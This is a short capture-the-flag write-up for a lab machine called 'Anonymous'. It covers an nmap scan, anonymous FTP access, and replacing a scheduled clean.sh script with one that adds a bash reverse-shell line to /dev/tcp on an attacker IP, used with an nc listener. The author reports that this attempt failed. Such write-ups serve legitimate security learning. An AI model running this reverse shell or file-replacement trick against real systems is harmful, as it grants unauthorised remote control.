# Anonymous v6
**IP:** _10.10.221.147_
I did a nmap scan and found:
> 21 (ftp), anonymous is allowed
> 22 (ssh)
> 139, 445 (smb)

I connected via ftp to the server. Here is what I found there in the scripts folder:
![ftp_server](./imgs/ftp_server.png)


I got these files.

*clean.sh*
![clean.sh](./imgs/clean.sh.png)

*removed_files.log*
![removed_files.log](./imgs/removed_files.log.png)

*removed_files.log* file is a part of *clean.sh* script. And if you look at the time when the *remove_files.log* was last changed you will notice that it was just changed, so we can suppose that *clean.sh* is scheduled to run (maybe every minute).<br>
We have permissions to put files on the ftp server.

I took the *clean.sh* file, changed it a little bit. Just added this line:<br>
`sh -i >& /dev/tcp/10.2.116.12/2222 0>&1`<br>
Connected to the ftp server, removed the original *clean.sh* and put my own. (Do not forget to set up nc listener.) The idea was that I would wait until the file would be executed and I would get a reverse-shell, but I did not work because the file does not have the permissions to be executed.